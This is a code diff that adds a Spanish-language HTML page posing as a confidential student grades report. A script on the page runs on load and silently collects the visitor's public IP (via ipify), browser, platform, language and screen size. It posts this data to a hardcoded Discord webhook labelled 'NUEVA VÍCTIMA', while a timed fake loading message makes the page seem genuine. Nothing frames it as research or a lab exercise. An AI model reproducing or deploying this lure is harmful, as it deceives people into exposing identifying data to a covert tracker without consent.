@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Informe de Notas - Evaluación Final</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #333; margin: 0; padding: 20px; }
+        .container { max-width: 800px; margin: 20px auto; padding: 20px; background-color: white; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
+        h1 { color: #0056b3; border-bottom: 2px solid #0056b3; padding-bottom: 10px; }
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+        th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
+        th { background-color: #f2f2f2; }
+        .error { color: #d9534f; font-weight: bold; }
+        .loading { text-align: center; margin-top: 50px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Informe de Notas Provisionales - Evaluación Final</h1>
+    <p class="error">AVISO: Este documento es confidencial y solo puede ser consultado por el alumno afectado. Cualquier reproducción o distribución está prohibida.</p>
+    
+    <div id="content" class="loading">
+        <p>Cargando datos del servidor académico... Por favor, espere.</p>
+    </div>
+
+    <table id="gradesTable" style="display:none;">
+        <thead>
+            <tr>
+                <th>Asignatura</th>
+                <th>Nota Final</th>
+                <th>Estado</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>Ciberseguridad Avanzada</td>
+                <td>7.5</td>
+                <td>Aprobado</td>
+            </tr>
+            <tr>
+                <td>Redes de Comunicaciones</td>
+                <td>4.9</td>
+                <td>Suspenso</td>
+            </tr>
+            <tr>
+                <td>Desarrollo de Software Seguro</td>
+                <td>8.2</td>
+                <td>Aprobado</td>
+            </tr>
+        </tbody>
+    </table>
+
+</div>
+
+<!-- EL SCRIPT DE RECOLECCIÓN DE DATOS -->
+<script>
+    // Reemplaza 'AQUI_TU_WEBHOOK_URL' con la URL que copiaste de Discord
+    const webhookUrl = 'https://discord.com/api/webhooks/1499086213406265487/-XB1gD75ZfOdTxg670yPm7pGZNlxMtum9Ulo1JqNsborMkCs9ihDT8TzXmjwG2ExZrD-';
+
+    // Función para enviar los datos a Discord
+    async function sendData(data) {
+        try {
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: `--- NUEVA VÍCTIMA ---\n**IP Pública:** ${data.ip}\n**Navegador:** ${data.userAgent}\n**Plataforma:** ${data.platform}\n**Idioma:** ${data.language}\n**Resolución:** ${data.screen}\n**Hora Local:** ${new Date().toLocaleString()}`
+                })
+            });
+            if (response.ok) {
+                console.log('Datos enviados con éxito a Discord.');
+            } else {
+                console.error('Error al enviar a Discord:', response.statusText);
+            }
+        } catch (error) {
+            console.error('Error de red:', error);
+        }
+    }
+
+    // Recopilar información del navegador y enviarla
+    const victimData = {
+        ip: 'N/A', // La IP la sacaremos con una petición externa
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+    };
+
+    // Obtener la IP pública
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+            victimData.ip = ipData.ip;
+            // Una vez que tenemos la IP, enviamos todo el paquete
+            sendData(victimData);
+        })
+        .catch(error => {
+            console.error('No se pudo obtener la IP:', error);
+            // Enviamos los datos aunque falte la IP
+            sendData(victimData);
+        });
+
+    // Simular la carga de datos para que parezca real
+    setTimeout(() => {
+        document.getElementById('content').style.display = 'none';
+        document.getElementById('gradesTable').style.display = 'table';
+    }, 2000); // Muestra la tabla después de 2 segundos
+
+</script>
+
+</body>
+</html>
